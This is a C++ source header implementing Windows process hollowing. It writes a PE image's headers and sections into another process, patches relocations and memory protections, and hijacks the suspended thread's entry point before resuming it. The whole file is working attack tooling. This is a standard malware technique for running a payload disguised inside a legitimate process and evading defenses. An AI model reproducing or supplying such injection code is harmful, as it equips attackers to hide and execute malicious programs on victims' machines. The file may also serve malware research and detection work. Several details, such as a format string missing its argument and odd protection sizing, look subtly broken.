#pragma once

#include "ntapi.h"
#include "mem.h"
#include "PE.h"


DWORD get_sec_protection(DWORD sectionCharacteristics)
{
    // sec has RWX
    if ((sectionCharacteristics & IMAGE_SCN_MEM_EXECUTE) &&
        (sectionCharacteristics & IMAGE_SCN_MEM_READ) &&
        (sectionCharacteristics & IMAGE_SCN_MEM_WRITE))
    {
        return PAGE_EXECUTE_READWRITE;
    }

    // sec has RX
    if ((sectionCharacteristics & IMAGE_SCN_MEM_EXECUTE) &&
        (sectionCharacteristics & IMAGE_SCN_MEM_READ))
    {
        return PAGE_EXECUTE_READ;
    }

    // sec only X
    if (sectionCharacteristics & IMAGE_SCN_MEM_EXECUTE)
    {
        return PAGE_EXECUTE_READ;
    }

    // sec has RW
    if ((sectionCharacteristics & IMAGE_SCN_MEM_READ) &&
        (sectionCharacteristics & IMAGE_SCN_MEM_WRITE))
    {
        return PAGE_READWRITE;
    }

    // sec only W
    if (sectionCharacteristics & IMAGE_SCN_MEM_READ)
    {
        return PAGE_READONLY;
    }

    // Default to read-write protection if no specific characteristics match
    return PAGE_READWRITE;
}


// Function to write PE sections from source process to destination process
bool WritePESections
(
    HANDLE hDestProcess,                // Handle to the destination process
    LPVOID destImageBase,               // Base address of the destination process' image
    const BYTE* pFileData,              // Pointer to the file data
    WORD numberOfSections,              // Number of sections in the source file
    IMAGE_DOS_HEADER* pDosHeader        // Pointer to the DOS header of the source file
) 
{
    for (WORD i = 0; i < numberOfSections; ++i) {
        // Calculate the offset to the current section header
        int iSectionOffset = pDosHeader->e_lfanew
            + sizeof(IMAGE_NT_HEADERS) + (sizeof(IMAGE_SECTION_HEADER) * i);

        // Get the current section header
        auto pSectionHeader = (IMAGE_SECTION_HEADER*)&pFileData[iSectionOffset];

        // Determine the destination section location in the target process memory
        LPVOID destSectionLocation = (LPVOID)((DWORD_PTR)destImageBase + pSectionHeader->VirtualAddress);

        // Determine the source section location in the source file data
        PVOID srcSectionLocation = (PVOID)&pFileData[pSectionHeader->PointerToRawData];

        // Write the current PE section from the source to the destination process memory
        if (!WriteProcessMemory(
            hDestProcess,
            destSectionLocation,
            srcSectionLocation,
            pSectionHeader->SizeOfRawData,
            NULL)) {
            // Log the error and return false if the write fails
            fprintf(stderr, "Could not write section to target process. ERROR: %d\n", GetLastError());
            return false;
        }
    }

    // Return true if all sections were written successfully
    return true;
}


// Function to patch section protections
bool PatchSectionProtections
(
    HANDLE hProcess,                    // Handle to the target process
    IMAGE_DOS_HEADER* pDosHeader,        // Pointer to the DOS header of the source file
    LPVOID destImageBase,               // Base address of the target process image
    const BYTE* pFileData,              // Pointer to the file data
    WORD numberOfSections,              // Number of sections in the PE file
    size_t imageSize                    // Size of the source image
)
{
    DWORD oldProtect = 0;
    int iSectionOffset = pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS);
    for (WORD i = 0; i < numberOfSections; ++i) {
        // Get the section header for the current section
        auto pSectionHeader = (IMAGE_SECTION_HEADER*)&(pFileData[iSectionOffset + (i * sizeof(IMAGE_SECTION_HEADER))]);

        // Determine section protection and offsets
        const DWORD sec_protect = get_sec_protection(pSectionHeader->Characteristics);
        const DWORD sec_offset = pSectionHeader->VirtualAddress;
        const DWORD sec_size = pSectionHeader->Misc.VirtualSize;
        const LPVOID section_va = (LPVOID)((ULONG_PTR)destImageBase + sec_offset);
        const DWORD protect_size = (DWORD)(imageSize - sec_offset);

        // Change the memory protection
        if (!VirtualProtectEx(hProcess, section_va, protect_size, sec_protect, &oldProtect)) {
            fprintf(stderr, "VirtualProtectEx failed for section %d. Error code: %lu\n", i, GetLastError());
            return false; // Return false on failure
        }
    }

    return true; // Return true if all protections were applied successfully
}

const PROCESS_INFORMATION MapTargetProcess(NewProcessInfo& srcProcessInfo, PROCESS_INFORMATION destProcessInfo, PVOID& destImageBase)
{
    SIZE_T ulSrcImageSize = srcProcessInfo.pNtHeaders->OptionalHeader.SizeOfImage;
    DWORD dwSrcHeaderSize = srcProcessInfo.pNtHeaders->OptionalHeader.SizeOfHeaders;
    WORD wSrcNumberOfSections = srcProcessInfo.pNtHeaders->FileHeader.NumberOfSections;

    // GET DELTA BETWEEN STARTING ADDRESS OF DUMMY PROCESS AND STARTING ADDRESS OF SOURCE'S PREFERRED ADDRESS (For part 6)
    DWORD deltaImageBase = (DWORD)destImageBase - srcProcessInfo.pNtHeaders->OptionalHeader.ImageBase;

    SIZE_T bytesRead = NULL;

    srcProcessInfo.pNtHeaders->OptionalHeader.ImageBase = (DWORD)destImageBase;
    SIZE_T dwBytesWritten = 0;

    DWORD oldProtect = 0; // Variable to store the old protection

    //1. Change Protection to RW
    if (!VirtualProtectEx(destProcessInfo.hProcess, destImageBase, ulSrcImageSize, PAGE_READWRITE, &oldProtect))
    {
        fprintf(stderr, "VirtualProtectEx failed. Error code:\n", GetLastError());
        exit(-1);
    }

    //2. WRITE THE PE HEADERS OF SOURCE PROCESS TO DESTINATION PROCESS' MEMORY LOCATION
    auto result = WriteProcessMemory(destProcessInfo.hProcess, destImageBase, srcProcessInfo.pFileData.get(), dwSrcHeaderSize, &dwBytesWritten);
    if (result == NULL)
    {
        printf("Failed to write source's PE header to dummy process");
    }

    //3. WRITE PE SECTIONS OF SOURCE TO DESTINATION

    if (!WritePESections(
        destProcessInfo.hProcess,          // Handle to the target process
        destImageBase,                     // Base address of the loaded image
        srcProcessInfo.pFileData.get(),    // File data from the source process
        wSrcNumberOfSections,              // Number of sections in the source file
        srcProcessInfo.pDosHeader          // Pointer to the DOS header of the source file
    )) 
    {
        fprintf(stderr, "Failed to write PE sections to the target process.\n");
        exit(-1);
    }

    //4. PATCH WRITTEN BYTES OF SOURCE PROCESS WITH RELOCATIONS
    int iSectionOffset = srcProcessInfo.pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS);
    srcProcessInfo.pSectionHeader = (IMAGE_SECTION_HEADER*)&(srcProcessInfo.pFileData.get()[iSectionOffset]);

    auto srcImageSection = srcProcessInfo.pSectionHeader;

    LPDWORD fileBytesRead = 0;
    for (auto i = 0; i < wSrcNumberOfSections; ++i)
    {
        BYTE* relocSecName = (BYTE*)".reloc";

        // ITERATE THROUGH EACH SECTION OF SOURCE PROCESS UNTIL '.RELOC' SECTION IS FOUND
        if (memcmp(srcImageSection->Name, relocSecName, 5) != 0)
        {
            srcImageSection++;
            continue;
        }

        // GET ADDRESS OF RELOCATION DATA
        DWORD srcRelocationTableRaw = srcImageSection->PointerToRawData;
        DWORD relocationOffset = 0;

        // ITERATE THROUGH EACH SECTION IN THE RELOCATION TABLE
        while (relocationOffset < srcProcessInfo.pRelocationTable->Size)
        {
            // POINTER TO START OF SECTION IN RELOCATION TABLE
            PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK) & (srcProcessInfo.pFileData.get()[srcRelocationTableRaw + relocationOffset]);

            // GET OFFSET TO NEXT SECTION
            relocationOffset += sizeof(BASE_RELOCATION_BLOCK);

            // GET ENTRY COUNT IN CURRENT RELOCATION SECTION
            DWORD relocationEntryCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);

            // GET ARRAY OF RELOCATION ENTRIES
            PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY) & (srcProcessInfo.pFileData.get()[srcRelocationTableRaw + relocationOffset]);

            // POINTER TO START OF RELOCATION ENTRY
            DWORD patchAddress = relocationBlock->PageAddress + relocationEntries[0].Offset;

            // ITERATE THROUGH EACH ENTRY OF THE RELOCATION SECTION
            for (DWORD i = 0; i < relocationEntryCount; i++)
            {
                relocationOffset += sizeof(BASE_RELOCATION_ENTRY);

                if (relocationEntries[i].Type == 0)
                {
                    continue;
                }

                // GET ADDRESS OF THE SECTION THAT REQUIRES PATCHING
                DWORD patchAddress = relocationBlock->PageAddress + relocationEntries[i].Offset;
                DWORD patchedBuffer = 0;

                // READ SECTION DATA TO A BUFFER
                ReadProcessMemory(destProcessInfo.hProcess, (LPCVOID)((DWORD)destImageBase + patchAddress), &patchedBuffer, sizeof(DWORD), &bytesRead);

                // PATCH SECTION DATA WITH THE DELTA
                patchedBuffer += deltaImageBase;

                // WRITE PATCHED DATA TO THE SECTION 
                WriteProcessMemory(destProcessInfo.hProcess, (PVOID)((DWORD)destImageBase + patchAddress), &patchedBuffer, sizeof(DWORD), fileBytesRead);
            }
        }
    }
    
    
    //5. PATCH SECTIONS PROTECTIONS
    if (!PatchSectionProtections
    (
        destProcessInfo.hProcess,       // Handle to the target process
        srcProcessInfo.pDosHeader,         // Pointer to the DOS header
        destImageBase,                  // Base address of the loaded image
        srcProcessInfo.pFileData.get(), // File data from the source process
        wSrcNumberOfSections,           // Number of sections in the source file
        ulSrcImageSize                  // Size of the source image
    )) 
    {
        fprintf(stderr, "Failed to patch section protections.\n");
        exit(-1);
    }

    return destProcessInfo;
}

void RunTargetProcess(const NewProcessInfo& srcProcessInfo, const PROCESS_INFORMATION& destProcessInfo, PVOID destImageBase)
{


    CONTEXT ctx = { CONTEXT_FULL };

    // GET TARGET'S THREAD CONTEXT, DUH
    BOOL bRet = BOOLIFY(GetThreadContext(destProcessInfo.hThread, &ctx));
    if (!bRet)
    {
        fprintf(stderr, "Could not get thread context. ERROR: %X\n", GetLastError());
        exit(-1);
    }

    // GET OFFSET TO SOURCE PROCESS' ENTRY POINT
    auto offsetEP = srcProcessInfo.pNtHeaders->OptionalHeader.AddressOfEntryPoint;

    // CHANGE CTX EAX TO POINT TO NEW ENTRY POINT
    ctx.Eax = (DWORD)destImageBase + offsetEP;

    // SET TARGET'S THREAD CONTEXT WITH NEW ENTRY POINT (EIP)
    bRet = BOOLIFY(SetThreadContext(destProcessInfo.hThread, &ctx));

    // CHECK IF SUCCESSFULLY SET NEW THREAD CONTEXT
    if (!bRet)
    {
        fprintf(stderr, "Could not set thread context. ERROR: %X\n", GetLastError());
        exit(-1);
    }

    // RESUME THE TARGET PROCESS & VOILA
    auto ThreadResult = ResumeThread(destProcessInfo.hThread);

    // UNLESS IT FAILED THEN BOO :(
    if (ThreadResult == -1)
    {
        fprintf(stderr, "ResumeThread Fail. ERROR: %d\n", GetLastError());
    }
}

